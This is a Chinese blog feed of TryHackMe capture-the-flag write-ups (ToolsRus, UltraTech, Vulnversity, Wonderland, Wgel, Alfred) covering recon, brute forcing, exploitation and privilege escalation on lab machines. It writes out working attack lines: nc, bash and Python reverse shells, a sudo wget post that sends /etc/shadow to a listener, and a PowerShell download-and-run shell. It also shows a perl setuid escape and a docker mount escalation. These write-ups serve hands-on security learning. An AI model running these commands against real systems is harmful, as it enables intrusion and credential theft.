<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tomcat@ubuntu:&#x2F;home&#x2F;jack$ echo &#39;mkfifo &#x2F;tmp&#x2F;ijuzeqf; nc 10.*.*.* 1234 0&lt;&#x2F;tmp&#x2F;ijuzeqf | &#x2F;bin&#x2F;sh &gt;&#x2F;tmp&#x2F;ijuzeqf 2&gt;&amp;1; rm &#x2F;tmp&#x2F;ijuzeqf&#39;&gt;id.sh</span><br><span class="line">&lt;ijuzeqf | &#x2F;bin&#x2F;sh &gt;&#x2F;tmp&#x2F;ijuzeqf 2&gt;&amp;1; rm &#x2F;tmp&#x2F;ijuzeqf&#39;&gt;id.sh</span><br></pre></td></tr></table></figure>
<p>重写好了，那么这时候我们要怎么执行这个文件才能获得root身份呢。sudo -l提示要输入密码，但是tomcat是无密码用户。所以行不通。</p>
<p>查看<code>/etc/crontab</code>看看有没有定时任务。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200502_192744.jpg" alt="jobs"></p>
<p>emmmmmmm…<br>开启监听，等下一分钟就能拿到shell了。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200502_192843.jpg" alt="root"></p>
<h1 id="另一种get-shell方式-不用msfconsole"><a href="#另一种get-shell方式-不用msfconsole" class="headerlink" title="另一种get shell方式(不用msfconsole)"></a>另一种get shell方式(不用msfconsole)</h1><p>总会遇到无法使用msf的情况的，比如：OSCP考试(</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;1.1.1.1 LPORT&#x3D;1234 -f war &gt; shell.war</span><br></pre></td></tr></table></figure>

<p>上传到war，并访问。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200502_195823.jpg" alt="war"></p>
<p>开启监听。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200502_200827.jpg" alt="war"></p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>tomcat</tag>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-ToysRus</title>
    <url>/2020/04/19/TryHackMe-ToysRus/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a href="https://tryhackme.com/room/toolsrus" target="_blank" rel="noopener">靶机链接</a><br>这个靶机主要引导你使用以下工具，一路收集信息，最终接管机器。</p>
<ul>
<li>Dirbuster</li>
<li>Hydra</li>
<li>Nmap</li>
<li>Nikto</li>
<li>Metasploit</li>
</ul>
<p>靶机难度:十分简单</p>
<a id="more"></a>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>常规思路，上来先<code>NMAP</code>扫一下<br><code>nmap -A -T5 -p- -vvv 10.10.32.4</code></p>
<p>通过扫描结果，我们可以发现目标机器开了四个端口。<br>分别是</p>
<ul>
<li>22 openssh7.4</li>
<li>80 apache httpd2.4.18</li>
<li>1234 apache tomcat7.0.88</li>
<li>8009 apache coyote 1.1</li>
</ul>
<p>先访问下网站，并且用dirbuster扫描看看网站路径。<br>dirbuster的使用相对简单，因为有图形化界面，设置好后开始即可<br><img src="https://images.atsud0.me/images/post/Screenshot_20200419_185031.jpg" alt="dirbuter"></p>
<p>最后我们能扫出三个目录<br><img src="https://images.atsud0.me/images/post/Screenshot_20200419_185200.jpg" alt="path"></p>
<p>访问了<code>guidelines</code>，只有一句话<br><img src="https://images.atsud0.me/images/post/Screenshot_20200419_185527.jpg" alt="guidelines"><br>这里可以猜测网站管理员是bob</p>
<p>访问<code>protected</code>,需要登录才能访问。尝试用<code>Hydra</code>，这个工具也有图形化界面，但是我使用的是命令行。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l bob -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz -t 10 -vV -e ns 10.10.32.4 http-get &#x2F;protected&#x2F;</span><br></pre></td></tr></table></figure>

<p>部分命令:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-l 指定用户名</span><br><span class="line">-p 指定密码</span><br><span class="line">-L 用户名字典</span><br><span class="line">-P 密码字典</span><br><span class="line">-t 线程</span><br><span class="line">-vV 输出详细信息</span><br><span class="line">-e ns 可选参数 n空密码试探，s指定用户名和密码</span><br><span class="line">http-get 指定服务名</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/Screenshot_20200419_190427.jpg" alt="hydra-pass"></p>
<p>密码很快就被跑出来了。</p>
<p>重新去访问<code>/protected/</code>提示我们服务已经被转移到其他的端口了。那就去看看nmap之前扫出来的1234端口吧。</p>
<p>可以看到是Apache Tomcat的站点<br><img src="https://images.atsud0.me/images/post/Screenshot_20200419_190733.jpg" alt="tomcat"></p>
<p>这里我们使用<code>nikto</code>这个工具扫描</p>
<p><code>nikto -host http://10.10.32.4:1234/manager/html</code></p>
<p>会扫出五个子目录手动去。<br>使用<code>hydra</code>跑出来的密码，尝试看看能不能登录。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200419_191305.jpg" alt="host-manager"></p>
<p>成功访问。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>接下来就是去查<code>exoploit</code>了看看有什么poc是我们可以直接去利用的。</p>
<p>有了tomcat的管理权限。我们可以直接利用<code>tomcat_mgr_upload</code>,设置好参数后直接利用。</p>
<p>拿到shell<br><img src="https://images.atsud0.me/images/post/Screenshot_20200419_191527.jpg" alt="shell"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学会了<code>Dirbuster，Hydra，Nikto</code>这三个工具的基本使用。</p>
<p><a href="https://www.itread01.com/content/1505575212.html" target="_blank" rel="noopener">nikto基本使用</a></p>
<p><a href="https://blog.51cto.com/jzking121/1770605" target="_blank" rel="noopener">hydra使用说明</a></p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>tomcat</tag>
        <tag>Metasploit</tag>
        <tag>hydra</tag>
        <tag>nikto</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-UltraTech</title>
    <url>/2020/06/15/TryHackMe-UltraTech/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><a href="https://tryhackme.com/room/ultratech1" title="" target="">在线链接:UltraTech</a>

<p>难度不高，但是涉及docker的一个靶机。</p>
<a id="more"></a>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫描<br><img src="https://images.atsud0.me/images/post/Screenshot_20200615_204241.jpg" alt=""></p>
<ul>
<li>21 ftp</li>
<li>22 ssh</li>
<li>8081 http node.js</li>
<li>31331 apache</li>
</ul>
<p>看到ftp先试试能不能匿名登录。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200615_204747.jpg" alt=""><br>可惜不成功。。</p>
<p>先去浏览下网站</p>
<p>8081端口是个api接口<br><img src="https://images.atsud0.me/images/post/Screenshot_20200615_224753.jpg" alt=""></p>
<p>31331端口下的http有robots.txt<br><img src="https://images.atsud0.me/images/post/Screenshot_20200615_224451.jpg" alt=""><br>好像是个站点地图。访问试试<br><img src="https://images.atsud0.me/images/post/Screenshot_20200615_224545.jpg" alt=""></p>
<p>找到登录页面:<br><img src="https://images.atsud0.me/images/post/Screenshot_20200615_224640.jpg" alt=""></p>
<p>随便提交几个请求，用bp抓包看看。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200615_224850.jpg" alt=""></p>
<h2 id="脆弱利用"><a href="#脆弱利用" class="headerlink" title="脆弱利用"></a>脆弱利用</h2><p>发现一个可能是命令执行的地方。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200615_210527.jpg" alt=""></p>
<p>尝试下执行id，虽然是成功了，但是好像只有一行输出。。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200615_232622.jpg" alt=""></p>
<p>ls之后发现有个sqlite的数据库<br><img src="https://images.atsud0.me/images/post/Screenshot_20200615_231854.jpg" alt=""></p>
<p>查看之后获得两个用户名和两个哈希值<br><img src="https://images.atsud0.me/images/post/Screenshot_20200615_232511.jpg" alt=""></p>
<p>这两个哈希是md5加密的，用hashcat跑下rockyou就出来了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -a 0 -m 0 &#39;md5&#39; ~&#x2F;tools&#x2F;rockyou.txt --force</span><br></pre></td></tr></table></figure>

<p>拿到密码后，尝试直接登录了网站后台，但是什么都没有<br><img src="https://images.atsud0.me/images/post/Screenshot_20200615_232829.jpg" alt=""></p>
<p>这里原本想直接命令执行<code>bash -c &#39;bash -i &gt;&amp;/dev/tcp/1.1.1.1/1234 0&gt;&amp;1&#39;</code>来获得www权限，但是尝试了多次都不行。</p>
<p>最后灵光一闪，想到了一个思路。既然直接运行反弹shell命令不行，那就自己写个反弹shell的脚本。然后运行不就好了？<br><img src="https://images.atsud0.me/images/post/Screenshot_20200615_225124.jpg" alt=""></p>
<p>反弹shell<br><img src="https://images.atsud0.me/images/post/Screenshot_20200615_225058.jpg" alt=""></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>拿到www用户权限。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200615_225410.jpg" alt=""></p>
<p>还有另外两个用户。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200615_225534.jpg" alt=""></p>
<p>我卡在这里差不多将近1个半小时。找不到可以利用的提权思路。在这段把玩的时间我发现登录ftp后的目录就是登录用户的家目录，r00t用户的密码和在前面sqlite数据库中爆破出来的一样。我原本以为能利用pkexec提权的，但是现实打了我脸。。</p>
<p>最后，我以为我真的没有办法的时候，看了一下r00t用户的id。结果发现r00t用户还是docker的组用户，这下我有多了一个提权方向了。。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200615_225921.jpg" alt=""></p>
<p>但是我做过的docker靶机还是比较少，一下子没能有什么好的办法。但是在freebuf中找到<a href="https://www.freebuf.com/articles/system/170783.html" title="" target="">普通用户借助Docker容器提权思路分享</a></p>
<p>使用docker命令看了一下之后，发现确实是有一个docker镜像，但是没有正在运行的镜像。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200615_230629.jpg" alt=""></p>
<p>因为我对docker不是很熟悉，所以跟着freebuf的文章操作。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200615_230908.jpg" alt=""><br>恩，一开始看到报错，我还傻眼了，怎么可能没有/bin/bash，不会把不会吧？<br><img src="https://images.atsud0.me/images/post/Screenshot_20200615_231021.jpg" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker ps 列出在运行的镜像</span><br><span class="line">docker images 列出存在的镜像</span><br><span class="line">docker run -it --rm -v &#x2F;etc:&#x2F;etc&#x2F; xxxx &#x2F;bin&#x2F;bash #运行镜像</span><br></pre></td></tr></table></figure>

<p>结果是被藏到了其他地方。。然后这时我又遇到了一个问题了，usermod命令没有找到。。这就说明我跟着freebuf操作的这条路断了一半。。可是此时我看到文章说：</p>
<blockquote>
<p>在这种多用户借助docker共用一台机器的情况下，普通用户可以轻松的借助docker提升为sudo用户，从而可以进行任意修改系统配置等各种恶意操作。</p>
</blockquote>
<p>看到这段话后我就怀疑这个靶机是不是也是如此。想到这里，我就想着看下/etc/shadow文件，看能不能看到docker外的用户信息(因为在docker镜像里面是root用户)<br><img src="https://images.atsud0.me/images/post/Screenshot_20200615_231253.jpg" alt=""><br>毫无疑问，镜像内和镜像外用的是同一个环境。这就简单了，我直接往/etc/passwd文件追加了一个用户。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200615_231424.jpg" alt=""><br>写好之后，退出镜像，直接切换用户test。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200615_231655.jpg" alt=""></p>
<p>此时我们已经获得root权限了。</p>
<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>用户组也很重要。<br>学会了一些docker的提权思路</p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>命令执行</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-Vulnversity</title>
    <url>/2020/04/14/TryHackMe-Vulnversity/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>这原本是个很简单的靶机，奈何自己蠢。搞了半天都搞不会。。</p>
<a id="more"></a>

<p>上来部署后，扫一下目标机器。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sV [ip]</span><br></pre></td></tr></table></figure>
<p>扫到有3333端口的网站。<br>浏览后，使用<code>gobuster</code>爆破网站路径，这是一个用于爆破网站路径，虚拟空间，dns子域的一个工具。</p>
<p><code>gobuster dir -u http://&lt;ip&gt;:3333 -w &lt;word list location&gt;</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  ~ gobuster --help</span><br><span class="line">Usage:</span><br><span class="line">  gobuster [command]</span><br><span class="line"></span><br><span class="line">Available Commands:</span><br><span class="line">  dir         Uses directory&#x2F;file brutceforcing mode</span><br><span class="line">  dns         Uses DNS subdomain bruteforcing mode</span><br><span class="line">  help        Help about any command</span><br><span class="line">  vhost       Uses VHOST bruteforcing mode</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -h, --help              help for gobuster</span><br><span class="line">  -z, --noprogress        Don&#39;t display progress</span><br><span class="line">  -o, --output string     Output file to write results to (defaults to stdout)</span><br><span class="line">  -q, --quiet             Don&#39;t print the banner and other noise</span><br><span class="line">  -t, --threads int       Number of concurrent threads (default 10)</span><br><span class="line">  -v, --verbose           Verbose output (errors)</span><br><span class="line">  -w, --wordlist string   Path to the wordlist</span><br><span class="line"></span><br><span class="line">Use &quot;gobuster [command] --help&quot; for more information about a command.</span><br></pre></td></tr></table></figure>

<p>可以使用Kali Linux默认的字典列表，在这<br><code>/usr/share/wordlists/</code></p>
<p>爆破出网站有个可以上传文件的地址。<br>利用此地址尝试上传php文件，结果请求被拒绝。</p>
<p>尝试使用<code>BurpSuite</code>去拦截请求，并爆破出能上传的文件后缀。<br>根据靶场提示，其实就可以知道能上传文件后缀的是phtml.<br>在执行payload的字典时，最好不要跟随TryHackMe带.后缀而是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">php1</span><br><span class="line">php4</span><br><span class="line">phtml</span><br></pre></td></tr></table></figure>

<p>带.的话，会被浏览器URL解析成了%2.</p>
<p>最后，<a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" target="_blank" rel="noopener" title="下载反弹shell的php文件">[下载反弹Shell]</a>，并修改IP地址，重命名为phtml后缀的文件，上传。</p>
<p>上传完成后，开始监听nc -lvnp 1234端口，默认1234，如果没有修改的话。</p>
<p>打开<a href="http://ip/internal/uploads/php-reverse-shell.php" target="_blank" rel="noopener">http://ip/internal/uploads/php-reverse-shell.php</a>   当你访问该URL后，Payload就会自动执行。此时再看看监听，已经看到上线了。<br><img src="https://images.atsud0.me/images/post/image-1586481856928.png" alt="file"></p>
<p>使用<code>find / -perm /4000 2&gt;&amp;1 | grep -v “Permission denied”</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; : 从根目录开始查找</span><br><span class="line">-perm: 任何拥有设置权限的二进制</span><br><span class="line">&#x2F;4000: 具有SUID 4000位</span><br><span class="line">2&gt;&amp;1:丢弃报错</span><br><span class="line">grep -v: 过滤权限不足的文件。</span><br></pre></td></tr></table></figure>
<p>最后尝试提权，根据网站给出的提示。<code>/bin/systemctl</code>，应该是要利用这东西提权。</p>
<p><a href="https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49" target="_blank" rel="noopener">systemctl绕过提权</a></p>
<p>编写payload<br><img src="https://images.atsud0.me/images/post/image-1586482484952.png" alt="file"></p>
<p>将编写好的payload，修改文件名后缀，上传到网站。最后在监听终端里面，将后缀修改为service，并开始监听9999。</p>
<p>当启动该服务的时候，就是在运行payload了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl start root.service</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-1586482630995.png" alt="file"><br>拿到root的flag !</p>
<p><a href="https://unicornsec.com/home/tryhackme-vulnversity" target="_blank" rel="noopener">完整Vulnversity流程解答</a></p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>GTFOBins-systemctl</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-Wonderland</title>
    <url>/2020/09/28/TryHackMe-Wonderland/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>在线靶机链接：<a href="https://tryhackme.com/room/wonderland" target="_blank" rel="noopener">Wonderland</a></p>
<a id="more"></a>

<h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><h3 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h3><p><img src="https://images.atsud0.me/images/post/image-20200928123603065.png" alt="image-20200928123603065"></p>
<ul>
<li>80 http</li>
<li>22 ssh</li>
</ul>
<h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><p><img src="https://images.atsud0.me/images/post/image-20200928123830954.png" alt="image-20200928123830954"></p>
<p><img src="https://images.atsud0.me/images/post/image-20200928123905068.png" alt="image-20200928123905068"></p>
<p><img src="https://images.atsud0.me/images/post/image-20200928123918443.png" alt="image-20200928123918443"></p>
<p><img src="https://images.atsud0.me/images/post/image-20200928123938806.png" alt="image-20200928123938806"></p>
<p>这个就有意思了 Keep Going？</p>
<p><img src="https://images.atsud0.me/images/post/image-20200928123953722.png" alt="image-20200928123953722"></p>
<p>发现多了个a目录。<br><img src="https://images.atsud0.me/images/post/image-20200928124050105.png" alt="image-20200928124050105"></p>
<p>a目录下的index.html还是keep going。</p>
<p><img src="https://images.atsud0.me/images/post/image-20200928124224681.png" alt="image-20200928124224681"></p>
<p><img src="https://images.atsud0.me/images/post/image-20200928124248370.png" alt="image-20200928124248370"></p>
<p>en …这应该是一个单词，rabbit。</p>
<p><img src="https://images.atsud0.me/images/post/image-20200928124332576.png" alt="image-20200928124332576"></p>
<p><img src="https://images.atsud0.me/images/post/image-20200928124345014.png" alt="image-20200928124345014"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Username:alice</span><br><span class="line">Password:HowDothTheLittleCrocodileImproveHisShiningTail</span><br></pre></td></tr></table></figure>

<h2 id="0x02-漏洞利用-amp-提权"><a href="#0x02-漏洞利用-amp-提权" class="headerlink" title="0x02 漏洞利用&amp;提权"></a>0x02 漏洞利用&amp;提权</h2><h3 id="alice"><a href="#alice" class="headerlink" title="alice"></a>alice</h3><p>登陆上alice用户后。发现目录下就有一个root.txt，但是没权限，有一个python脚本。使用sudo -l发现可以使用rabbit用户执行这个python脚本。</p>
<p><img src="https://images.atsud0.me/images/post/image-20200928142036624.png" alt="image-20200928142036624"></p>
<p><img src="https://images.atsud0.me/images/post/image-20200928142155223.png" alt="image-20200928142155223"></p>
<p>代码的文本内容有点多，反正就差不多是这样</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">poem=<span class="string">"""一个故事"""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    line = random.choice(poem.split(<span class="string">"\n"</span>))</span><br><span class="line">    print(<span class="string">"The line was:\t"</span>, line)</span><br></pre></td></tr></table></figure>

<p>这就简单啦，导入了random模块，我们在当前目录下重新写个random.py。它就会优先导入当前目录下的random.py。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os,socket,subprocess</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">s.connect((<span class="string">'ip'</span>,<span class="number">8888</span>))  </span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">'/bin/bash'</span>,<span class="string">'-i'</span>])</span><br></pre></td></tr></table></figure>

<p>创建好反弹shell的脚本后，执行。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u rabbit python3.6 ~/walrus_and_the_carpenter.py</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20200928142810015.png" alt="image-20200928142810015"></p>
<h3 id="rabbit"><a href="#rabbit" class="headerlink" title="rabbit"></a>rabbit</h3><p>在rabbit的家目录下发现有一个suid的程序。</p>
<p><img src="https://images.atsud0.me/images/post/image-20200928142951177.png" alt="image-20200928142951177"></p>
<p>但是这里没有gdb，也没有strings什么的。所以把它传回kali后看看。</p>
<p><img src="https://images.atsud0.me/images/post/image-20200928150131678.png" alt="image-20200928150131678"></p>
<p>啊，这样的话。可以直接环境变量劫持，因为echo是绝对路径，所以选择date程序。</p>
<p><img src="https://images.atsud0.me/images/post/image-20200928143350516.png" alt="image-20200928143350516"></p>
<p>嗯。。看起来是越权到了hatter。</p>
<h3 id="hatter"><a href="#hatter" class="headerlink" title="hatter"></a>hatter</h3><p>进到该用户的家目录后，发现有一个明文的密码。是hatter用户的密码。</p>
<p><img src="https://images.atsud0.me/images/post/image-20200928143652157.png" alt="image-20200928143652157"></p>
<p>但是，该用户并不是sudo用户。。嗯。。尴尬了。手工进行了一些简单的信息收集后，发现并没有多大收获，还是上脚本好了。</p>
<p><img src="https://images.atsud0.me/images/post/image-20200928145132461.png" alt="image-20200928145132461"></p>
<p>这里发现perl有设置这个CAP_SETUID，允许改变进程的uid。关于Capabilities可以看<a href="https://cloud.tencent.com/developer/article/1529342" target="_blank" rel="noopener">这里</a></p>
<p><img src="https://images.atsud0.me/images/post/image-20200928145417612.png" alt="image-20200928145417612"></p>
<p>GTFObins给出了利用方法。</p>
<p><img src="https://images.atsud0.me/images/post/image-20200928145511044.png" alt="image-20200928145511044"></p>
<p>。。不是hatter组用户，所以要ssh登陆上去。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -e &#39;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;&#x2F;bin&#x2F;sh&quot;;&#39;</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20200928145646599.png" alt="image-20200928145646599"></p>
<p>user.txt在root目录下，root在alice目录下。。这。。</p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Capabilities-CAP_SETUID</tag>
        <tag>GTFOBins-perl</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-Wget-CTF</title>
    <url>/2020/05/17/TryHackMe-Wgel-CTF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>靶机在线链接:<a href="https://tryhackme.com/room/wgelctf" target="_blank" rel="noopener">Wgel-CTF</a></p>
<p>靶机难度:十分简单</p>
<a id="more"></a>

<p>nmap扫描端口后发现开放了两个服务<br><img src="https://images.atsud0.me/images/post/Screenshot_20200513_092749.jpg" alt="nmap"></p>
<p>进一步扫描之后,发现有.ssh目录,私钥文件泄露</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200513_093031.jpg" alt="dirb"></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200513_121224.jpg" alt="id-rsa"></p>
<p>有私钥文件,但是没用户名啊..查看了sitemap目录的用户作者,分别猜测<code>Dave</code>和<code>Miller</code>用户名,但是都不正确.</p>
<p>只好重头开始找线索,发现这个页面有点不正常,查看页面源代码之后发现<br><img src="https://images.atsud0.me/images/post/Screenshot_20200513_121444.jpg" alt="index"><br><img src="https://images.atsud0.me/images/post/Screenshot_20200517_125915.jpg" alt="code"><br>原来这里已经给出了用户名…说明细节是多么的重要啊!<br>使用index源代码给的用户名成功登录<br><img src="https://images.atsud0.me/images/post/Screenshot_20200517_123833.jpg" alt="login"></p>
<p>登录进来后,并没有直接在家目录下看到flag,搜索一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find .&#x2F; -name &quot;*flag*&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200517_125209.jpg" alt="flag"></p>
<p>拿到第一个flag了,让我们看看当前用户的sudo权限<br><img src="https://images.atsud0.me/images/post/Screenshot_20200517_123937.jpg" alt="sudo"></p>
<p>虽然这个用户是超级管理员,但是我们不知道他的密码,但是我们还有一个不需要密码就能以root身份运行的程序呢<code>wget</code></p>
<p>虽然<code>wget</code>不能直接被我们用于提权,但是我们可以用它来读取root用户下我们不该读取的配置文件.如<code>/etc/shadow</code>诸如此类的.</p>
<p>所以我们要这样利用,首先,我们在攻击机中先开启一个监听,并把接受到的内容重定向到一个文件中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 1234 &gt; hash</span><br></pre></td></tr></table></figure>
<p>接着在我们的jessie用户的终端上输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo wget --post-file&#x3D;&#39;&#x2F;etc&#x2F;shadow&#39; Listen-IP:Port</span><br></pre></td></tr></table></figure>
<p>Listen-IP和端口,是攻击方的ip和监听的端口</p>
<p>此时再查看hash文件,就有目标机器<code>/etc/shadow</code>文件的信息了<br><img src="https://images.atsud0.me/images/post/Screenshot_20200517_124826.jpg" alt="/etc/shadow"></p>
<p>不过,我们的目标只是root_flag.<br><img src="https://images.atsud0.me/images/post/Screenshot_20200517_125329.jpg" alt="root-flag"><br><img src="https://images.atsud0.me/images/post/Screenshot_20200517_125402.jpg" alt="flag"></p>
<p>总结一下:学会了<code>sudo wget</code>读取文件的操作</p>
<p>参考链接:<a href="https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/" title="" target="">linux-for-pentester-wget-privilege-escalation</a></p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>GTFOBins-Wget</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-alfred</title>
    <url>/2020/05/25/TryHackMe-alfred/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><a href="https://tryhackme.com/room/alfred" title="" target="">靶机链接:Alfred</a>
<p>靶机难度:十分简单</p>
<a id="more"></a>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ports&#x3D;$(nmap -p- --min-rate&#x3D;1000  -T4 10.10.101.210 | grep ^[0-9] | cut -d &#39;&#x2F;&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s&#x2F;,$&#x2F;&#x2F;)</span><br><span class="line">nmap -sC -sV -p$ports 10.10.101.210</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/Screenshot_20200521_201602.jpg" alt="nmap"></p>
<p>访问80端口没东西，8080<code>Jenkins</code>上来直接弱口令登录成功<br><img src="https://images.atsud0.me/images/post/Screenshot_20200521_201717.jpg" alt="login"></p>
<p><code>configure</code>配置处可以执行系统命令<br><img src="https://images.atsud0.me/images/post/Screenshot_20200521_201858.jpg" alt="configure"></p>
<p>使用<a href="https://github.com/samratashok/nishang/" title="" target="">nishang</a>的脚本powershell脚本，使用<code>Jenkins</code>的提供的web命令窗口执行下载命令。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell iex (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;your-ip&#x2F;Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200521_202048.jpg" alt=""></p>
<p>先开启一个nc监听后，执行。等待反弹一个powershell。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200521_202902.jpg" alt="aa"></p>
<p>在<code>C:\Users\bruce\Desktop&gt;</code>处获得<code>user-flag</code>。</p>
